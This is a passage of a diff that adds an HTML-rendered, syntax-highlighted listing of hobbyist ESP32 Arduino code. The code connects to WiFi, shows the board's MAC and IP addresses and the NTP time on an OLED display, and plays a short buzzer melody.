+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; password &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;PASSWORD&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// set the display
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;SSD1306Wire &lt;span style=&#34;color:#a6e22e&#34;&gt;display&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x3c&lt;/span&gt;, SDA, SCL); 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// Define NTP client to get time
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;WiFiUDP ntpUDP;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;NTPClient &lt;span style=&#34;color:#a6e22e&#34;&gt;timeClient&lt;/span&gt;(ntpUDP);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// Variables to save date and time
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;String formattedDate;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;String dayStamp;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;String timeStamp;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// connect to WiFi function
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;connectToWiFi&lt;/span&gt;() {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  Serial.print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Connecting to WiFi&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;// set wifi to station mode (client mode)
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  WiFi.mode(WIFI_STA);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  WiFi.begin(ssid, password);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; attempt &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;// while loop that adds a dot for each second that the status is not connected yet
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt;(WiFi.status() &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; WL_CONNECTED){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Serial.print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;.&amp;#34;&lt;/span&gt;); &lt;span style=&#34;color:#75715e&#34;&gt;// print a dot to serial
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    display.drawString(attempt, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;.&amp;#34;&lt;/span&gt;); &lt;span style=&#34;color:#75715e&#34;&gt;// draw a dot next to the last one.
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    display.display(); &lt;span style=&#34;color:#75715e&#34;&gt;// refresh the display so what was drawn actually shows
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    attempt&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;// increase the attempt counter (acts as x axis for dots being printed)
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    delay(&lt;span style=&#34;color:#ae81ff&#34;&gt;1000&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// utility function for digital clock display: prints leading 0
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;String &lt;span style=&#34;color:#a6e22e&#34;&gt;twoDigits&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; digits){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(digits &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    String i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;String(digits);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; i;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; String(digits);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// plays a tone from a particular pin for a set amount of time
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;tone&lt;/span&gt;(byte pin, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; freq, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; length) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ledcSetup(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2000&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;); &lt;span style=&#34;color:#75715e&#34;&gt;// setup beeper
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  ledcAttachPin(pin, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;); &lt;span style=&#34;color:#75715e&#34;&gt;// attach beeper
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  ledcWriteTone(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, freq); &lt;span style=&#34;color:#75715e&#34;&gt;// play tone
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  delay(length); &lt;span style=&#34;color:#75715e&#34;&gt;// play for as long as specified
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  ledcWriteTone(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;); &lt;span style=&#34;color:#75715e&#34;&gt;// then turn off
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;playMelody&lt;/span&gt;() {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;// notes in the melody:
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; melody[] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    NOTE_C4, NOTE_G3, NOTE_G3, NOTE_A3, NOTE_G3, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, NOTE_B3, NOTE_C4
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  };
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;// note durations: 4 = quarter note, 8 = eighth note, etc.:
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; noteDurations[] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  };
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;// loop to play the melody specified
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; thisNote &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; thisNote &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(melody)&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(melody[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]); thisNote&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    tone(&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;, melody[thisNote], &lt;span style=&#34;color:#ae81ff&#34;&gt;1000&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;noteDurations[thisNote]);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;setup&lt;/span&gt;() {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;// set the baud rate and print newlines to serial
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  Serial.begin(&lt;span style=&#34;color:#ae81ff&#34;&gt;9600&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  Serial.println();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  Serial.println();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;// initialize the display and set font
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  display.init();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  display.flipScreenVertically();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  display.setFont(ArialMT_Plain_10);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  connectToWiFi();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;// set pin 14 for output
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  pinMode(&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;, OUTPUT);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  playMelody();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  display.drawString(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;hello&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  display.display();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  delay(&lt;span style=&#34;color:#ae81ff&#34;&gt;3000&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  display.clear();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;// show the mac address in serial and on the screen
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  Serial.print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ESP Board MAC Address:  &amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  Serial.println(WiFi.macAddress());
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  display.drawString(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ESP Board MAC Address: &amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  display.drawString(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;, WiFi.macAddress());
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  display.display();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;// show the IP address on screen
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  display.drawString(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ESP Board IP Address: &amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  display.drawString(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;, WiFi.localIP().toString());
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  display.display();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;// start the time client and set timezone GMT -8
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  timeClient.begin();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  timeClient.setTimeOffset(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;25200&lt;/span&gt;); delay(&lt;span style=&#34;color:#ae81ff&#34;&gt;5000&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;// get the datetime
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;timeClient.update()) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    timeClient.forceUpdate();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;// Extract Date and Time
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  formattedDate &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; timeClient.getFormattedTime();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; epochTime &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; timeClient.getEpochTime();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  setTime(epochTime);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  Serial.println(formattedDate);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;// Extract date
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; splitT &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; formattedDate.indexOf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;T&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  dayStamp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; formattedDate.substring(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,splitT);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  display.drawString(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;TIME: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; dayStamp);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  display.display();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;// save some power
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  WiFi.mode(WIFI_OFF);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;loop&lt;/span&gt;() {
